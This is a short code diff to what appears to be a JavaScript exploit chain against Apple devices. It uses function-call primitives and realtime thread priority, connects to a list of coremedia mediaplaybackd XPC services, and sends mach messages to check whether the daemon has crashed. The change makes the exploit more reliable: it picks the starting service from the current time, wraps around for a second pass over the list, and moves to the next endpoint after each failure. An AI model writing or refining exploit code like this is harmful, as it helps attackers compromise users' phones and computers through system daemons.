@@ -6251,17 +6251,25 @@
     }
     let success = false;
     let services = ["com.apple.coremedia.mediaplaybackd.asset.xpc", "com.apple.coremedia.mediaplaybackd.assetimagegenerator.xpc", "com.apple.coremedia.mediaplaybackd.cpe.xpc", "com.apple.coremedia.mediaplaybackd.cpeprotector.xpc", "com.apple.coremedia.mediaplaybackd.figcontentkeyboss.xpc", "com.apple.coremedia.mediaplaybackd.figcontentkeysession.xpc", "com.apple.coremedia.mediaplaybackd.figcpecryptor.xpc", "com.apple.coremedia.mediaplaybackd.figmetriceventtimeline.xpc", "com.apple.coremedia.mediaplaybackd.formatreader.xpc", "com.apple.coremedia.mediaplaybackd.visualcontext.xpc"];
+    let service_rotation = Date.now() % services.length;
+    if (service_rotation != 0) {
+      services = services.slice(service_rotation).concat(services.slice(0, service_rotation));
+    }
+    LOG(`service rotation start=${service_rotation} service_count=${services.length}`);
     let services_idx = 0n;
+    let service_attempt_limit = BigInt(services.length * 2);
     set_realtime_priority(gpu_fcall(PTHREAD_SELF), 0, 50, 50);
     pthread_yield_np(pthread_self());
-    for (let attempt = 0n; attempt < 8n; attempt++) {
+    for (let attempt = 0n; attempt < service_attempt_limit; attempt++) {
       if (services_idx >= services.length) {
-        break;
+        LOG("wrapping service list for second pass");
+        services_idx = 0n;
       }
       let TARGET_XPC_SERVICE = services[services_idx];
       let connection = xpcjs_xpc_connect(TARGET_XPC_SERVICE);
       if (connection == null) {
-        LOG(`connection failed, retrying again with a different endpoint...`);
+        LOG(`connection failed for ${TARGET_XPC_SERVICE}, retrying with a different endpoint...`);
+        services_idx++;
         continue;
       }
       LOG(`connected to ${TARGET_XPC_SERVICE}`);
@@ -6314,6 +6322,7 @@
         kr = mach_msg(test_msg.msg, MACH_SEND_MSG | MACH_SEND_TIMEOUT | MACH_RCV_MSG | MACH_RCV_TIMEOUT, test_msg.msg_size, test_msg.msg_size + PAGE_SIZE, connection["reply_port"], 15n, MACH_PORT_NULL);
         if (kr != MACH_SEND_TIMED_OUT) {
           LOG("[x] Error: Daemon likely crashed, retrying...");
+          services_idx++;
           break;
         }
         success = true;
